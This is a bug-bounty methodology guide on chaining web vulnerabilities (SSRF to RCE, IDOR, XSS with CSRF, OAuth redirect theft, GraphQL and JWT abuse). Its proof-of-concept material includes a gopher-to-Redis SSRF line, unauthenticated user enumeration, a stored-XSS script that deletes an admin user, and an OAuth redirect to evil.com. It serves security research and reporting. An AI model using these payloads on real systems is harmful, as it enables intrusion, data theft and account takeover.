# Vulnerability Chaining Methodology — 2026

## The Core Idea

Single medium-severity bugs pay $500-$1,000. The SAME bugs chained together pay $10,000-$50,000+. Chaining is how top hunters turn average findings into critical reports.

## The Chain Framework

```
[Entry Point] → [Weak Control] → [Adjacent System] → [Privilege Escalation] → [Business Impact] → [Critical]
```

### For every finding, ask:
- **ENABLES**: Does this finding give me access to something new?
- **AMPLIFIES**: Does this finding make another bug worse?
- **BYPASSES**: Does this finding bypass a security control on another feature?
- **CHAINS**: Does this finding trigger a secondary action?
- **ESCALATES**: Can I go from read to write, user to admin, or guest to root?

## Proven Chain Patterns (with PoC)

### Pattern 1: SSRF → Internal API → RCE
**Severity**: Medium + Low = Critical
**Payout**: $10K-$50K

```
1. Find SSRF in URL fetch feature (Medium)
2. Discover internal admin API via SSRF probing (Low/Info)
3. Use SSRF to hit internal API that executes commands (Critical)
```

**PoC**:
```bash
# Step 1: Confirm SSRF
curl -s "https://target.com/fetch?url=http://collaborator.net/test"
# Collaborator receives callback → SSRF confirmed

# Step 2: Probe internal services
curl -s "https://target.com/fetch?url=http://127.0.0.1:8080/"
curl -s "https://target.com/fetch?url=http://127.0.0.1:9200/"  # Elasticsearch?
curl -s "https://target.com/fetch?url=http://127.0.0.1:6379/"  # Redis?

# Step 3: RCE via internal service
# If Redis is found: use gopher protocol
curl -s "https://target.com/fetch?url=gopher://127.0.0.1:6379/_*2%0d%0a$4%0d%0a..."
```

### Pattern 2: Auth Bypass → IDOR → Data Exfiltration
**Severity**: Medium + Medium = Critical
**Payout**: $5K-$25K

```
1. Find auth bypass: missing auth on internal API (Medium)
2. Find IDOR in the same endpoint or related one (Medium)
3. Chain: use the auth-less endpoint to enumerate user IDs (Critical)
```

**PoC**:
```bash
# Step 1: No auth required on internal endpoint
curl -s "https://internal-api.target.com/users" -H "Authorization: null"
# Returns user list without auth!

# Step 2: enumerate all users
for id in $(seq 1 1000); do
  curl -s "https://internal-api.target.com/users/$id/orders"
done
# All users' orders accessible without auth
```

### Pattern 3: XSS → CSRF → Admin Action
**Severity**: Medium + Medium = Critical
**Payout**: $3K-$15K

```
1. Find stored XSS in user profile/comments (Medium)
2. Find CSRF on admin actions (Medium)
3. Chain: XSS delivers CSRF → performs admin action (Critical)
```

**Payload**:
```html
<!-- Store this in profile/comment -->
<script>
// Fetch CSRF token
fetch('/admin/delete-user').then(r => r.text()).then(html => {
  const token = html.match(/csrf_token=([^"']+)/)[1];
  // Delete admin user
  fetch('/admin/delete-user', {
    method: 'POST',
    body: 'user_id=1&csrf_token=' + token,
    credentials: 'include'
  });
});
</script>
```

### Pattern 4: Info Disclosure → Credential Reuse → Account Takeover
**Severity**: Low + Low = Critical
**Payout**: $5K-$20K

```
1. Find info disclosure: internal email addresses in error messages (Low)
2. Find password in old JS file or git history (Low)
3. Chain: email + password = ATO on admin account (Critical)
```

**PoC**:
```bash
# Step 1: Extract emails from errors
curl -s "https://target.com/api/users/999999" | grep -oP '[a-zA-Z0-9._%+-]+@target.com'
# admin@target.com leaked!

# Step 2: Search git history for passwords
git log -p --all | grep -i password
# Found: admin:Welcome2023!

# Step 3: Login as admin
curl -s -X POST "https://target.com/api/login" \
  -d 'email=admin@target.com&password=Welcome2023!'
# Logged in as admin!
```

### Pattern 5: Open Redirect → OAuth Token Theft → Account Takeover
**Severity**: Medium + Medium = Critical
**Payout**: $3K-$15K

```
1. Find open redirect on OAuth flow (Medium)
2. Phishing link steals OAuth callback (Medium)
3. Chain: stolen OAuth token = full account takeover (Critical)
```

**PoC**:
```
# The open redirect:
https://target.com/auth/callback?redirect_uri=https://evil.com/steal

# Attacker sends phishing link:
https://target.com/auth/login?redirect_uri=https://evil.com/steal

# When user logs in, OAuth token is sent to evil.com
```

### Pattern 6: GraphQL Introspection → Hidden Mutation → Privilege Escalation
**Severity**: Medium + Medium = High/Critical
**Payout**: $2K-$10K

```graphql
# Step 1: Introspection
query { __schema { types { name fields { name } } } }

# Step 2: Find hidden mutation in schema
mutation { grantAdminRole(userId: "victim", role: "admin") { success } }

# Step 3: Chain with batching attack
# If role validation is done client-side, send both:
mutation { 
  grantAdminRole1: grantAdminRole(userId: "victim", role: "admin") { success }
  grantAdminRole2: grantAdminRole(userId: "attacker", role: "superadmin") { success }
}
```

### Pattern 7: JWT Confusion → IDOR → SSRF → RCE
**Severity**: Low + Medium + High = Critical
**Payout**: $10K+

```
1. JWT accepts "none" algorithm (Low)
2. Forged JWT gives access to IDOR endpoint (Medium)
3. IDOR reveals SSRF-capable server-side function (High)
4. SSRF to internal Redis → RCE (Critical)
```

## Chain Identification Process

For every target, build a connection matrix:
```
        | F1(SSRF) | F2(IDOR) | F3(XSS) | F4(CORS)
F1      |    -     | ENABLES  |   -     | BYPASSES
F2      |    -     |    -     |   -     |   -
F3      |    -     |   -      |   -     | AMPLIFIES
F4      |    -     | ESCALATES|   -     |   -
```

Connection types:
- **ENABLES**: F1 gives access needed by F2
- **AMPLIFIES**: F1 makes F2 more dangerous
- **BYPASSES**: F1 bypasses security control on F2
- **CHAINS**: F1 triggers F2's vulnerable function
- **ESCALATES**: F1 takes F2 from read to write/admin

## Chain Scoring

Re-calculate CVSS for the FULL chain:

| Component | Individual CVSS | Chained CVSS |
|-----------|----------------|--------------|
| SSRF | 6.5 (Medium) | 9.8 (Critical) |
| IDOR | 5.3 (Medium) | 8.8 (High) |
| RCE via chain | — | 10.0 (Critical) |

## Tips for Reporting Chains

1. **Title pattern**: `[Vuln1] + [Vuln2] → [Vuln3] = [Final Impact]`
2. **Describe the path** step by step — triager must follow easily
3. **Show each step independently first**, then the full chain
4. **Quantify impact**: "This chain lets attacker access $500K in assets"
5. **Include PoC for each link** in the chain — not just the final result
